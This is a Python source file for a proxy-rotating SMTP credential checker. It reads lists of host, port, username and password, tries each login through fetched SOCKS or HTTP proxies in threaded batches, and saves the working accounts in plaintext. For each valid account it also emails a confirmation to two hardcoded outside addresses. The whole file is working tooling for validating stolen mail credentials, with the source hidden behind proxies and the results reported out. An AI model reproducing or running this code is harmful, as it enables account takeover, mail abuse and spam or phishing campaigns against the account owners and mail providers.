import os
import re
from EEPro import Engine
# import concurrent.futures
# from threading import Thread
import smtplib
import socks
import random
import socket
import threading
import queue
import time
import logging
from collections import defaultdict
from servers import Credentials, MX_Server


from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


proxy_queue = queue.Queue()
result_queue = queue.Queue()

threads = []  # Track active threads
successful_credentials = set()  # Track successfully authenticated credentials

engine = Engine()

def load_credentials(file_path):
	smtps = engine.read_file(file_path)
	if smtps is None:
		engine.logger.error("No valid SMTP credentials loaded.")
		return []
	else:
		engine.logger.info("Loading SMTP credentials...")
		credentials = []
		for line in smtps:
			parts = line.strip().split('|')
			if len(parts) == 4:
				username = parts[2].strip()
				if '@' not in username:
					engine.logger.warning(f"Invalid username format: {username}")
					continue
				host = parts[0]
				port = int(parts[1])  # Ensure port is an integer
				password = parts[3]
				domain = username.split('@')[1].strip().lower()
				details = Credentials(host, port, username, password, domain)
				credentials.append(details)
		engine.logger.info(f"Loaded {len(credentials)} SMTP credentials.")
		return credentials

def refresh_proxies(grouped_credentials):
	"""
	Refresh and test proxies for each SMTP host group and add valid proxies to the queue.
	"""
	while True:
		proxy_list = engine.fetch_proxy()
		if not proxy_list:
			engine.logger.error("Unable to load proxies, retrying...")
			time.sleep(10)
			continue
		for (host, port), _ in grouped_credentials.items():
			print(f"Finding Proxy for: {host}", end="\n")
			proxy = engine.find_valid_proxy(host, port, proxy_list)
			if proxy is not None:
				print(f"Valid Proxy found for: {host}")
				mx_server = MX_Server(host, port)
				proxy_queue.put((proxy, mx_server))
		time.sleep(10)  # Refresh every 10 seconds

def start_checker(file_path):
	smtp_credentials = load_credentials(file_path)
	if not smtp_credentials:
		engine.logger.error("No valid SMTP credentials loaded.")
		return []
	grouped_credentials = group_by_host(smtp_credentials)
	proxy_thread = threading.Thread(target=refresh_proxies, args=(grouped_credentials,), daemon=True)
	proxy_thread.start()
	threads.append(proxy_thread)
	batch_thread = threading.Thread(target=process_batches, args=(grouped_credentials,), daemon=True)
	batch_thread.start()
	threads.append(batch_thread)
	for thread in threads:
		thread.join()
	results = []
	while not result_queue.empty():
		results.append(result_queue.get())
	return results

def group_by_host(credentials):
	grouped = defaultdict(list)
	engine.logger.info("Scanning MX servers...")
	total_credentials = len(credentials)
	current_count = 0
	domain_cache = {}

	for credential in credentials:
		current_count += 1
		if re.match(r"[^@]+@[^@]+\.[^@]+", credential.username) and engine.filter_spam(credential.username.split('@')[0].strip()):
			domain = credential.username.split('@')[1].strip().lower()
			if not engine.is_banned_tld(domain):
				print(f"\rFetching MX servers: {current_count}/{total_credentials} ({int((current_count / total_credentials) * 100)}%)\033[K", end="")
				if domain in domain_cache:
					mx_server = domain_cache[domain]
				else:
					mx_server = engine.get_mx_servers(domain)
					domain_cache[domain] = mx_server
				if mx_server is not None:
					key = (mx_server, credential.port)
					grouped[key].append(credential)
	print("\nFinished fetching MX servers.")
	return grouped



def process_batches(grouped_credentials):
	"""
	Process credentials in batches using proxies assigned to their respective MX servers.
	"""
	proxy_map = {}  # Map of MX server to its assigned proxy
	while True:
		try:
			proxy, mx_server = proxy_queue.get(timeout=30)
			if proxy is None or mx_server is None:
				engine.logger.warning("No valid proxy retrieved, retrying...")
				proxy_queue.task_done()
				continue
			if mx_server not in proxy_map:
				proxy_map[mx_server] = proxy
				engine.logger.info(f"Proxy {proxy.host}:{proxy.port} assigned to MX server {mx_server.host}:{mx_server.port}")
			
			assigned_proxy = proxy_map[mx_server]
			for (current_mx_server, port), credentials in grouped_credentials.items():
				if current_mx_server == mx_server:
					batches = [credentials[i:i + 10] for i in range(0, len(credentials), 10)]
					for batch in batches:
						thread = threading.Thread(
							target=test_smtp_batch,
							args=(current_mx_server, port, batch, assigned_proxy)
						)
						thread.start()
						threads.append(thread)
			proxy_queue.task_done()
		except queue.Empty:
			# engine.logger.warning("No proxies in queue, waiting...")
			time.sleep(5)
			continue
		except Exception as e:
			engine.logger.error(f"Unexpected error in process_batches: {e}")
			time.sleep(5)

def save_valid_smtp(mx_server, credentials):
	save_dir = os.path.join(os.path.expanduser("~"), "Desktop")
	file_path = os.path.join(save_dir, "validated_smtp.txt")

	with open(file_path, 'a') as file:
		data = f"{mx_server.host}|{mx_server.port}|{credentials.username}|{credentials.password}"
		file.write(data + '\n')
		return


def test_smtp_batch(mx_server, port, batch, proxy):
	"""
	Test a batch of credentials using a specific proxy.
	"""
	for smtp_detail in batch:
		credential_key = f"{smtp_detail.username}"
		if credential_key in successful_credentials:
			engine.logger.info(f"Skipping already authenticated credential: {credential_key}")
			continue
		try:
			match proxy.protocol:
				case 'socks4':
					socks.set_default_proxy(socks.SOCKS4, proxy.host, proxy.port)
				case 'socks5':
					socks.set_default_proxy(socks.SOCKS5, proxy.host, proxy.port)
				case 'http':
					socks.set_default_proxy(socks.PROXY_TYPE_HTTP, proxy.host, proxy.port)
			socks.wrapmodule(smtplib)
			with smtplib.SMTP(mx_server, port, timeout=10) as server:
				server.ehlo(f"{smtp_detail.domain}")
				server.starttls()
				server.ehlo(f"{smtp_detail.domain}")
				server.login(smtp_detail.username, smtp_detail.password)
				msg = MIMEMultipart()
				msg['From'] = smtp_detail.username
				msg['To'] = 'mark.boleigha@outlook.com, donhoenix@gmail.com'
				msg['Subject'] = 'Validation completed'
				body = f"This is a test email to validate the connection for {smtp_detail.username}."
				msg.attach(MIMEText(body, 'plain'))
				server.sendmail(smtp_detail.username, ['mark.boleigha@outlook.com', 'donhoenix@gmail.com'], msg.as_string())
				save_valid_smtp(mx_server, smtp_detail)
				successful_credentials.add(credential_key)
				result_queue.put(f"Success: {smtp_detail.username}")
				server.noop()
		except (smtplib.SMTPException, socket.error) as e:
			engine.logger.error(f"SMTP test failed for {smtp_detail.username}: {e}")
			result_queue.put(f"Failure: {smtp_detail.username} - {e}")